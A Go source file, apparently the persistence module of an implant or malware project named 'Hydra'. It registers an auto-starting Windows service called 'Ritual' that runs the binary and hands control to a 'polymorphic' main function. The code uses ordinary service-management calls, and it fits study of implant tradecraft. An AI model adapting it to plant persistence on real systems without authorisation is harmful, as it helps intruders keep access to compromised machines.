package persistence

import (
	"log"
	"os"
	"path"
	"runtime"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

type svcHandler struct {
	main func()
}

func (m *svcHandler) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.StartPending}
	os.Setenv("poly", "poly")
	log.Println("Polymorphic main call")
	go m.main()
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

loop:
	for {
		c := <-r
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
			time.Sleep(100 * time.Millisecond)
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			break loop
		case svc.Pause:
			changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
		case svc.Continue:
			changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
		}
	}
	changes <- svc.Status{State: svc.StopPending}
	return
}

// TryServiceInstall attempts to install a Windows Service pointing to Hydra.
func TryServiceInstall() error {
	bin := path.Join(os.ExpandEnv(Info.Base), Binary)

	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	cfg := mgr.Config{
		DisplayName: DisplayName,
		Description: Description,
		StartType:   mgr.StartAutomatic,
	}
	s, err := m.CreateService(Service, bin, cfg, "svcmode")
	if err != nil {
		return err
	}
	defer s.Close()

	return nil
}

var (
	Service = "Ritual"
)

// UninstallService attempts to uninstall the Windows Service created by Hydra.
func UninstallService() error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	s, err := m.OpenService(Service)
	if err != nil {
		return err
	}
	defer s.Close()

	return s.Delete()
}

// HandleService starts accepting Service Control Commands from the operating system.
func HandleService(polyfunc func()) {
	h := &svcHandler{polyfunc}
	svc.Run(Service, h)
	runtime.Goexit()
}
